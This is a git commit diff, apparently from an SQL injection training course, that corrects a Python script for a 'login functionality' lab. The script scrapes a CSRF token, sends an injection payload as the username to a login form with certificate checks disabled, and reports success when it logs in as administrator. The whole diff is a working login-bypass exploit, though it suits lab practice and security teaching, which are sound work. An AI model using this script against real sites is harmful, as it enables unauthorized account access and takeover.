a6cea2c8182451ee39a9e97c50f9b4b3c7c20593
Alexander Kostrov <iamgalantus@gmail.com>
2022-04-29 20:21:13 +0500

    feat(module): add module 2 with log in sql injections

--- lesson_02 - login functionality/script_02.py
+++ lesson_02 - login functionality/script_02.py
@@ -1,31 +1,27 @@
-from ssl import VerifyMode
 import sys
-from urllib import request
 import requests
-import urllib3
 from bs4 import BeautifulSoup
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
+import urllib3
 
 proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
-def create_csrf_token(session, url):
+def create_csrf_token(session: requests.Session, url: str) -> str:
     request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
-    soup = BeautifulSoup(request_to_get_csrf_token.text, "html_parser")
+    soup = BeautifulSoup(request_to_get_csrf_token.text, "html.parser")
     csrf_token = soup.find("input")["value"]
     return csrf_token
 
 
-def exploit_sql_injection(session, url, payload):
+def exploit_sql_injection(session: requests.Session, url: str, payload: str) -> bool:
     csrf_token = create_csrf_token(session, url)
-    data = {"data": csrf_token, "username": payload, "password": "randomtext"}
-    request_to_check_exploit = request.post(url, data=data, verify=False, proxies=proxy)
+    data = {"csrf": csrf_token, "username": payload, "password": "randomtext"}
+    request_to_check_exploit = session.post(url, data=data, verify=False, proxies=proxy)
     result = request_to_check_exploit.text
     if "Log out" in result:
         return True
     return False
+
 
 if __name__ == "__main__":
     try:
@@ -36,7 +32,7 @@ if __name__ == "__main__":
         print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
         sys.exit(-1)
     exploit_session = requests.Session()
-    if exploit_sql_injection(exploit_session, sql_injection_payload):
+    if exploit_sql_injection(exploit_session, url, sql_injection_payload):
         print("[+] SQL injections successful. I log in as administrator")
     else:
         print("[-] SQL injections unsuccessful")
